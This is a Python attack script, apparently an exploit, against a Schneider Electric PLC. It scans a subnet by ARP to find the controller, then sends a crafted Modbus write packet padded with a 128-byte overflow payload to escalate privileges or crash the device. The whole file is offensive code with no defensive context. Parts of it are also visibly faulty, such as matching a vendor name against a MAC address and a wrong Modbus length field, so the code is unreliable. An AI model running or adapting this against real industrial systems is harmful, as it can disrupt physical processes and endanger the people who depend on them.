import socket
import struct
from scapy.all import ARP, Ether, srp

# Step 1: Discover PLC's IP Address
def discover_plc_ip(network_range="192.168.9.0/24"):
    print("[*] Discovering devices on the network...")
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered, _ = srp(arp_request, timeout=2, verbose=0)

    for sent, received in answered:
        # Check for known IP or device MAC signature of the Schneider PLC
        if "Schneider Electric" in received.hwsrc:  # Replace with actual MAC signature if known
            print(f"[+] PLC discovered at IP: {received.psrc}")
            return received.psrc

    print("[-] No PLC discovered in the network.")
    return None

# Step 2: Exploit Privilege Escalation via Modbus Vulnerability
def exploit_modbus_privilege_escalation(plc_ip, target_register=0x1000):
    MODBUS_PORT = 502

    # Connecting to the PLC on Modbus
    try:
        print(f"[*] Connecting to PLC at {plc_ip}:{MODBUS_PORT}...")
        plc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        plc_socket.connect((plc_ip, MODBUS_PORT))
        print("[+] Connected to PLC.")

        # Crafting a malicious Modbus packet
        print("[*] Crafting malicious Modbus packet...")
        transaction_id = 1   # Modbus Transaction ID
        protocol_id = 0      # Modbus Protocol ID (always 0 for Modbus/TCP)
        length = 6           # Remaining bytes in message (Unit ID + Function Code + Data)
        unit_id = 1          # Unit ID of the PLC (usually 1)
        function_code = 6    # Modbus Write Single Register (used as part of exploit)
        address = struct.pack('>H', target_register)  # Target address (overflow target)
        exploit_payload = b"\x41" * 128  # Overflow payload (e.g., "A"*128)

        # Combine all parts into a malicious Modbus packet
        packet = struct.pack('>HHHBB', transaction_id, protocol_id, length, unit_id, function_code)
        packet += address + exploit_payload

        # Send the malicious packet
        print(f"[*] Sending payload to target register {hex(target_register)}...")
        plc_socket.send(packet)

        # Receive the response (if any)
        response = plc_socket.recv(1024)
        if response:
            print("[+] Received response from the PLC:", response.hex())
        else:
            print("[-] No response received. The PLC may have crashed or is unresponsive.")

        plc_socket.close()

    except Exception as e:
        print(f"[-] Error during exploitation: {e}")

# Run exploitation workflow
if __name__ == "__main__":
    # Configuration
    NETWORK_RANGE = "192.168.9.0/24"  # Target network range for discovery

    # Discover PLC IP
    plc_ip = discover_plc_ip(NETWORK_RANGE)
    if not plc_ip:
        print("[!] Exiting: PLC not found on the network.")
    else:
        # Exploit privilege escalation
        exploit_modbus_privilege_escalation(plc_ip)